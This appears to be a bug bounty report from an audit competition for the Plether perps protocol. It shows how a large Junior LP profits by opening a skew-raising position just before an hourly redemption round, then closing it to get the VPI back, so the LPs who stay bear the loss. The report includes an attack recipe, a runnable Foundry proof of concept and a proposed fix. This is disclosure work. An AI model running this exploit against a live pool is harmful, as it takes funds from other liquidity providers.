# \#98361 [SC-Critical] LP share prices count VPI that the position's close will refund, so an LP exiting at an hourly round takes value from the LPs who stay

**Submitted on Nov 7th 2026 at 10:37:56 UTC by @RichJamo for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98361
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

The pool counts a skew-raising open's VPI charge as LP value at once, although the position's close will refund it. An LP who redeems at the next hourly round, having opened that position from another account, is paid on the inflated share price and then gets the charge back as a trader; the LPs who stay pay the rebate. In production a large Junior holder can repeat this every hourly round, with no admin action.

## Vulnerability Details

The settlement sidecar books an open's VPI as pool revenue with cash arrived, so LP value rises in the same transaction (`CfdEngineSettlementSidecar.sol:454-463`):

```solidity
if (delta.tradeCostAssets > 0) {
    uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
    if (poolCashInflowAssets > 0) {
        IHousePool(host.pool())
            .recordClaimantInflow(
                poolCashInflowAssets,
                IHousePool.ClaimantInflowKind.Revenue,
                IHousePool.ClaimantInflowCashMode.CashArrived
            );
    }
}
```

The close lowers skew and earns the VPI back as a rebate. The lifetime clamp only stops lifetime VPI going negative, so the close can return everything the open paid (`CloseAccountingLib.sol:116-118`):

```solidity
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

So the charge is a refundable deposit that LP value treats as earned. An LP redeeming at the next round is priced on that inflated value (`HousePool.sol:835`).

**Attack**

1. Hold a large Junior share and request a redemption of it.
2. Two minutes before the round, open a large skew-raising position from another account.
3. The round pays the redemption at the raised LP value.
4. Close the position; the rebate returns the VPI.

**Why this is not the intended design.** VPI is meant to pay LPs for carrying skew. Here they carry none, and the charge is reversed within minutes. The team says anticipated VPI should not inflate symmetric NAV (`SECURITY.md:871-872`), and the only LP timing transfer they accept is for carry (`ACCOUNTING_SPEC.md:737-740`). The clamp's comment targets a different sandwich, through pool depth (`CloseAccountingLib.sol:112-114`), not the hourly LP round.

## Impact Details

Selected impact: direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield (Critical). The loss falls on the remaining LPs, every hourly round.

Measured on the real contracts at release settings: a 7.8M USDG pool (Senior 3.8M), the attacker holding 75% of Junior, and a position of 39% of pool depth, under the 40% skew cap.

- Opening the position raised LP value by about 6,615 USDG.
- Against a control round with no trade, the LPs who stayed lost about 2,373 USDG. The attacker's profit was about 1,156 of that; the other 1,217 paid the round trip's fees to the protocol treasury.
- Three rounds in a row gave the attacker 1,156, 1,159 and 1,162 USDG.
- The attacker needs a large Junior share: a 129 USDG loss at 55%, a 132 USDG gain at 60%, so break-even is about 58%. The program's rules say a high capital requirement is not a reason to downgrade.
- Pyth confidence does not enter VPI (`CfdMath.sol:150-180`); it only widens the attacker's execution spread, and the test sets it at 9 bp, near the 10 bp limit.
- One bound: the close rebate is capped at free pool cash (`CfdEnginePlanLib.sol:973-977`), so a cash-tight pool weakens the attack. The test's rebate is paid in full.

## Recommendation

Keep the charge, the rebate and the clamp. Hold the still-refundable part of collected VPI outside LP value until the position closes, mirroring the existing reserve for negative lifetime VPI (`SECURITY.md:866-870`).

## References

Code, at the contest commit:
- VPI booked as pool revenue with cash arrived, so LP value rises at once: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L454-L463
- The close rebate, bounded by lifetime VPI (the clamp): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L112-L118
- LP redemptions priced on that value at the round: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L835
- The rebate capped at free pool cash: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L973-L977
- VPI takes no confidence input: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdMath.sol#L150-L180

Team documents:
- Anticipated VPI should not inflate symmetric NAV: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L871-L872
- The reserve for negative lifetime VPI, which the fix mirrors: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L866-L870
- The carry timing transfer the team accepts: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L737-L740
- Release parameters used by the test: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md


## Proof of Concept

## Proof of Concept

A runnable Foundry test on the real contracts, with no change to any in-scope contract. It uses the repository's own `BasePerpTest` fixture (real Router, Engine, HousePool, Clearinghouse and both TrancheVaults) at commit a82d4fef, with the release risk parameters from `packages/perps/DEPLOYMENT.md` and the release adverse-confidence multiplier (2,500 bps). Only public entry points act. Every attack round is compared with a control round that takes the same steps without opening the position.

**What one round does (`_round`):**

1. The pool holds 1M USDG of Junior owned by the stayers (the test contract) and 3.8M USDG of Senior. The attacker deposits Junior until it owns 75% of Junior, and funds a separate trading account.
2. The attacker requests redemption of all its Junior shares.
3. Two minutes before the round boundary, the attacker's trading account opens a long of 39% of pool depth (under the 40% skew cap). LP value is read just before and just after the open.
4. The hourly round settles and funds the redemption in full at the current LP value.
5. The attacker closes the long, earning the VPI back as a rebate, and claims the redemption.
6. The test records the attacker's total USDG (LP and trader accounts), the stayers' Junior value and the protocol treasury's balance, and compares them with the control.

**The three tests:**

- `test_RefundableVpiMovesValueFromStayersToTheExitingLp`: one round. Asserts that LP value rises when the position opens, the attacker gains, the stayers lose, and the stayers' loss equals the attacker's gain plus the treasury's fees (within 1 USDG).
- `test_ProfitNeedsAJuniorShareAboveAboutFiftyEightPercent`: the same round at attacker shares from 40% to 75% of Junior. Asserts the gain rises with the share, is negative at 55% and positive at 60%.
- `test_ItRepeatsRoundAfterRound`: three rounds in a row, each from the state the previous attack left. Asserts profit and a loss to the stayers every round.

**Run it:**

```
git clone https://github.com/immunefi-team/audit-comp-plether && cd audit-comp-plether
git checkout a82d4fef && git submodule update --init --recursive
# save the test below as packages/perps/test/perps/invariant/properties/VpiLpValueTransfer.t.sol
cd packages/perps && forge test --match-path 'test/perps/invariant/properties/VpiLpValueTransfer.t.sol' -vv
```

**Output on Forge 1.5.1** (USDG has 6 decimals, so 1156306339 is about 1,156 USDG):

```
Ran 3 tests for test/perps/invariant/properties/VpiLpValueTransfer.t.sol:VpiLpValueTransferTest
[PASS] test_ItRepeatsRoundAfterRound() (gas: 21244355)
Logs:
  round attacker gain, USDG (6 dp): 1156306339
  round loss to stayers, USDG (6 dp): 2373322138
  round attacker gain, USDG (6 dp): 1158975615
  round loss to stayers, USDG (6 dp): 2375631496
  round attacker gain, USDG (6 dp): 1161650873
  round loss to stayers, USDG (6 dp): 2377946835

[PASS] test_ProfitNeedsAJuniorShareAboveAboutFiftyEightPercent() (gas: 54734216)
Logs:
  attacker's share of Junior, bps: 4000
  => attacker gain against the control, USDG (6 dp): -812654645
  attacker's share of Junior, bps: 5000
  => attacker gain against the control, USDG (6 dp): -370299002
  attacker's share of Junior, bps: 5500
  => attacker gain against the control, USDG (6 dp): -129042826
  attacker's share of Junior, bps: 5750
  => attacker gain against the control, USDG (6 dp): -1334172
  attacker's share of Junior, bps: 6000
  => attacker gain against the control, USDG (6 dp): 132182270
  attacker's share of Junior, bps: 6500
  => attacker gain against the control, USDG (6 dp): 422078863
  attacker's share of Junior, bps: 7500
  => attacker gain against the control, USDG (6 dp): 1156306337

[PASS] test_RefundableVpiMovesValueFromStayersToTheExitingLp() (gas: 7823058)
Logs:
  attacker gain against the control, USDG (6 dp): 1156306339
  loss to the LPs who stayed, USDG (6 dp): 2373322138
  protocol treasury gain against the control, USDG (6 dp): 1216806157
  LP value rise when the position opened, USDG (6 dp): 6615037262

Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 77.30ms (109.29ms CPU time)

Ran 1 test suite in 336.22ms (77.30ms CPU time): 3 tests passed, 0 failed, 0 skipped (3 total tests)
exit 0
```

**The test file, `VpiLpValueTransfer.t.sol`:**

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {stdStorage, StdStorage} from "forge-std/Test.sol";

/// @title PoC: VPI is counted in LP value while the position's close will still refund it, so an LP who exits at a round
///        takes value from the LPs who stay
/// @notice Place at packages/perps/test/perps/invariant/properties/ and run:
///         forge test --match-path 'test/perps/invariant/properties/VpiLpValueTransfer.t.sol' -vv
/// @dev Real Router, Engine, HousePool and both TrancheVaults from BasePerpTest, at commit a82d4fef, with the release risk
///      parameters from packages/perps/DEPLOYMENT.md and the release adverse-confidence multiplier (2,500 bps).
///      Every attack run is compared with a control: the same steps with no position opened. Only public entry points act.
contract VpiLpValueTransferTest is BasePerpTest {
    using stdStorage for StdStorage;

    uint256 internal constant QUANTUM = 1e20;
    address internal constant KEEPER = address(0xE0EC);
    address internal constant ATTACKER_LP = address(0xA77A);
    address internal constant ATTACKER_TRADER = address(0xA77B);
    address internal constant SENIOR_LP = address(0x5E2);
    uint256 internal constant STAYER_JUNIOR = 1_000_000e6; // this contract's own Junior, from BasePerpTest
    uint256 internal constant SENIOR_ASSETS = 3_800_000e6;
    uint256 internal constant ATTACKER_SHARE_BPS = 7500; // attacker's share of Junior, excluding the seed
    uint256 internal constant POSITION_BPS = 3900; // position notional as a share of pool depth, under the 40% skew cap
    uint256 internal constant OPEN_LEAD_SECONDS = 120; // open two minutes before the round
    uint256 internal constant MARGIN_BPS = 500;

    uint256 internal px = 1e8;
    uint64 internal pythConfidence;

    struct Outcome {
        uint256 attackerTotal;
        uint256 stayerValue;
        uint256 treasuryValue;
        uint256 navBeforeOpen;
        uint256 navAfterOpen;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory params) {
        params = super._riskParams();
        params.vpiFactor = 0.01e18;
        params.maintMarginBps = 10;
        params.initMarginBps = 20;
        params.fadMarginBps = 300;
        params.baseCarryBps = 500;
    }

    function setUp() public override {
        super.setUp();
        // The release oracle is constructed with 2,500 bps (DEPLOYMENT.md); the harness oracle defaults to 2,000. Changing
        // it through the 72-hour timelock leaves LP deposits unavailable in this harness, so the slot is set directly.
        address oracle = address(router.pletherOracle());
        uint256 slot = stdstore.target(oracle).sig("adverseConfidenceMultiplierBps()").find();
        vm.store(oracle, bytes32(slot), bytes32(uint256(2500)));
        pythConfidence = 9e4; // 9 bp at a price of 1.00, near the 10 bp basket limit
        _setSeniorCapacity(type(uint256).max - 1, 8000);
        _fundSenior(SENIOR_LP, SENIOR_ASSETS);
        router.updateMarkPrice(_freshData(px, 0));
    }

    function _freshData(uint256 price, uint64 previousPublishTime) internal returns (bytes[] memory data) {
        vm.warp(block.timestamp + 1);
        vm.roll(block.number + 1);
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(), int64(uint64(price)), pythConfidence, -8, uint64(block.timestamp), previousPublishTime
        );
        data = new bytes[](1);
        data[0] = abi.encode(price);
    }

    function _trade(bool isClose, uint256 size) internal {
        _tradeAs(ATTACKER_TRADER, CfdTypes.Side.LONG, isClose, size);
    }

    function _tradeAs(address account, CfdTypes.Side side, bool isClose, uint256 size) internal {
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = keccak256(abi.encode(block.timestamp, block.number, router.nextCommitId()));
        request.bounds.submitBy = uint64(block.timestamp + router.maxExecutionWindowSeconds());
        request.bounds.executionWindowSeconds = uint32(router.maxExecutionWindowSeconds());
        request.bounds.allowedExecutionModes = 7;
        request.bounds.expectedConfigHash = router.lifecycleBook().currentExecutionConfigHash();
        request.bounds.maxExecutionBountyAssets = type(uint256).max;
        request.bounds.maxExecutionNotionalAssets = type(uint256).max;
        request.bounds.maxGrossAccountDebitAssets = type(uint256).max;
        request.bounds.maxActionChargeAssets = type(uint256).max;
        request.bounds.maxExplicitFeesAssets = type(uint256).max;
        request.bounds.maxPostPositionSize = type(uint256).max;
        request.bounds.maxPostLeverageBps = type(uint32).max;
        request.side = side;
        request.sizeDelta = size;
        request.isClose = isClose;
        request.marginDelta = isClose ? 0 : (size / 1e12) * MARGIN_BPS / 10_000;
        bool acceptsHighPrice = (side == CfdTypes.Side.LONG) == isClose;
        request.targetPrice = acceptsHighPrice ? engine.CAP_PRICE() : 1;
        vm.prank(account);
        uint64 id = router.commitOrder(request);
        bytes[] memory data = _freshData(px, uint64(block.timestamp));
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(id, data);
        assertEq(uint256(result.status), 2, "order did not execute");
    }

    function _juniorValue(address who) internal view returns (uint256) {
        return juniorVault.convertToAssets(juniorVault.balanceOf(who));
    }

    function _treasuryValue() internal view returns (uint256) {
        return settlementToken.balanceOf(PROTOCOL_TREASURY_ACCOUNT) + clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT);
    }

    function _round(bool attack) internal returns (Outcome memory o) {
        return _round(attack, ATTACKER_SHARE_BPS);
    }

    /// @dev One round: the attacker holds `attackerShareBps` of Junior, queues a full redemption, opens a skew-raising long
    ///      two minutes before the round (or nothing, for the control), the round settles, the long closes, and the
    ///      redemption is claimed.
    function _round(bool attack, uint256 attackerShareBps) internal returns (Outcome memory o) {
        uint256 attackerDeposit = (STAYER_JUNIOR * attackerShareBps) / (10_000 - attackerShareBps);
        _fundJunior(ATTACKER_LP, attackerDeposit);
        _fundTrader(ATTACKER_TRADER, 5_000_000e6);
        vm.warp(block.timestamp + 2 hours);
        router.updateMarkPrice(_freshData(px, 0));

        uint256 shares = juniorVault.balanceOf(ATTACKER_LP);
        vm.prank(ATTACKER_LP);
        uint256 requestId = juniorVault.requestRedeem(shares, ATTACKER_LP, ATTACKER_LP);
        uint256 boundary = pool.lpEpochStart(requestId);
        uint256 start = settlementToken.balanceOf(ATTACKER_LP) + clearinghouse.balanceAssets(ATTACKER_TRADER);

        vm.warp(boundary - OPEN_LEAD_SECONDS);
        router.updateMarkPrice(_freshData(px, 0));
        (, o.navBeforeOpen,,) = pool.getPendingTrancheState();
        uint256 size = (pool.totalAssets() * POSITION_BPS / 10_000) * 1e12;
        size -= size % QUANTUM;
        if (attack) {
            _trade(false, size);
        }
        (, o.navAfterOpen,,) = pool.getPendingTrancheState();

        vm.warp(boundary + 1);
        router.settleLpEpoch(_freshData(px, uint64(engine.lastMarkTime())));
        if (attack) {
            _trade(true, size);
        }
        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, ATTACKER_LP);
        assertEq(claimable, shares, "redemption not fully funded");
        vm.prank(ATTACKER_LP);
        juniorVault.claimRedeem(requestId, claimable, ATTACKER_LP, ATTACKER_LP);
        o.attackerTotal = settlementToken.balanceOf(ATTACKER_LP) + clearinghouse.balanceAssets(ATTACKER_TRADER) - start;
        o.stayerValue = _juniorValue(address(this));
        o.treasuryValue = _treasuryValue();
    }

    /// @dev The headline: one round at release settings. The attacker ends richer than the control, the LPs who stay poorer,
    ///      and LP value rose by the VPI the instant the position opened. The stayers' loss is the attacker's gain plus the
    ///      round trip's fees, which the protocol treasury receives.
    function test_RefundableVpiMovesValueFromStayersToTheExitingLp() public {
        uint256 snap = vm.snapshotState();
        Outcome memory control = _round(false);
        vm.revertToState(snap);
        Outcome memory attack = _round(true);
        int256 attackerGain = int256(attack.attackerTotal) - int256(control.attackerTotal);
        int256 stayerLoss = int256(control.stayerValue) - int256(attack.stayerValue);
        int256 treasuryGain = int256(attack.treasuryValue) - int256(control.treasuryValue);
        emit log_named_int("attacker gain against the control, USDG (6 dp)", attackerGain);
        emit log_named_int("loss to the LPs who stayed, USDG (6 dp)", stayerLoss);
        emit log_named_int("protocol treasury gain against the control, USDG (6 dp)", treasuryGain);
        emit log_named_int("LP value rise when the position opened, USDG (6 dp)", int256(attack.navAfterOpen) - int256(attack.navBeforeOpen));
        assertGt(attack.navAfterOpen, attack.navBeforeOpen, "LP value counts the VPI at once");
        assertGt(attackerGain, 0, "the exiting LP profits");
        assertGt(stayerLoss, 0, "the LPs who stay pay for it");
        assertApproxEqAbs(stayerLoss, attackerGain + treasuryGain, 1e6, "the stayers' loss goes to the attacker and the fees");
    }

    /// @dev The attacker captures only its share of the VPI but pays the whole round trip's spread and fee, so profit needs a
    ///      large Junior share. The same round at several shares, each against its own control: the gain rises with the
    ///      share and turns positive between 55% and 60%.
    function test_ProfitNeedsAJuniorShareAboveAboutFiftyEightPercent() public {
        uint256[7] memory sharesBps = [uint256(4000), 5000, 5500, 5750, 6000, 6500, 7500];
        int256[7] memory gains;
        for (uint256 i; i < sharesBps.length; ++i) {
            uint256 snap = vm.snapshotState();
            Outcome memory control = _round(false, sharesBps[i]);
            vm.revertToState(snap);
            snap = vm.snapshotState();
            Outcome memory attack = _round(true, sharesBps[i]);
            vm.revertToState(snap);
            gains[i] = int256(attack.attackerTotal) - int256(control.attackerTotal);
            emit log_named_uint("attacker's share of Junior, bps", sharesBps[i]);
            emit log_named_int("=> attacker gain against the control, USDG (6 dp)", gains[i]);
            if (i > 0) {
                assertGt(gains[i], gains[i - 1], "the gain rises with the share");
            }
        }
        assertLt(gains[2], 0, "at a 55% share the round trip costs more than the attacker captures");
        assertGt(gains[4], 0, "at a 60% share the attacker profits");
    }

    /// @dev The same round three times in a row from the state the previous attack left, each against its own control.
    function test_ItRepeatsRoundAfterRound() public {
        for (uint256 i; i < 3; ++i) {
            uint256 snap = vm.snapshotState();
            Outcome memory control = _round(false);
            vm.revertToState(snap);
            Outcome memory attack = _round(true);
            int256 attackerGain = int256(attack.attackerTotal) - int256(control.attackerTotal);
            int256 stayerLoss = int256(control.stayerValue) - int256(attack.stayerValue);
            emit log_named_int("round attacker gain, USDG (6 dp)", attackerGain);
            emit log_named_int("round loss to stayers, USDG (6 dp)", stayerLoss);
            assertGt(attackerGain, 0, "profit every round");
            assertGt(stayerLoss, 0, "stayers lose every round");
        }
    }
}
```

